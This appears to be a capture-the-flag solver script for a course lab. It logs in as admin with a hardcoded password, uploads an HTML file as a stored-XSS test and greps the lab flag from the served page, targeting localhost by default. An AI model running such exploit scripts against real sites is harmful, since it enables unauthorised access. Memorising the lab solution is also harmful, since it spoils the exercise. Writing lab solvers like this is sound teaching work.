#!/usr/bin/env bash
# Vuln 1: Stored XSS — HTML upload preview exposes FLAG_UPLOAD in hidden span.
# Login as admin, upload an .html file, view it, extract flag from data attribute.
URL="${1:-http://localhost}"
LOGIN_USER="${2:-admin}"
LOGIN_PASS="${3:-supercalifragilisticexpialidociousandthequickbrownfoxjumpsoverthelazydog}"

COOKIE_JAR="$(mktemp)"
HTML_TMP="$(mktemp --suffix=.html)"
trap 'rm -f "$COOKIE_JAR" "$HTML_TMP"' EXIT

# Create a minimal HTML payload
printf '%s\n' '<!DOCTYPE html><html><body><p>xss</p></body></html>' > "$HTML_TMP"

# Login
curl -sf -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST \
  -d "username=${LOGIN_USER}&password=${LOGIN_PASS}" \
  "${URL}/login" \
  -o /dev/null -w '' -L

# Upload the HTML file
curl -sf -b "$COOKIE_JAR" -F "file=@${HTML_TMP};filename=xss.html" "${URL}/upload" -o /dev/null

# Fetch the uploaded file and extract the flag
RESP="$(curl -sf -b "$COOKIE_JAR" "${URL}/uploads/xss.html")"
echo "$RESP" | grep -oE 'ENPM634\{[^}]+\}' | grep -F 'stored_xss' | head -1
